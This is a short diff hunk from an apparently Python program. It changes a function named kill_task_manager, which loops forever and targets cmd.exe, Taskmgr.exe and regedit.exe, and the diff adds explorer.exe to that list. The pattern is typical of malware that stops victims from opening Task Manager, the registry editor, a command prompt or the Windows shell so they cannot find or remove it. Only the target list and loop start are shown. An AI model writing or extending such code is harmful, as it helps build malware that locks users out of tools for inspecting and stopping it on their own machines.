@@ -51,7 +51,7 @@ class Dispatcher:
         
         
 def kill_task_manager() -> None:
-    processes = ['cmd.exe', 'Taskmgr.exe', 'regedit.exe']
+    processes = ['cmd.exe', 'Taskmgr.exe', 'regedit.exe', 'explorer.exe']
     
     while True:
         time.sleep(1.2)
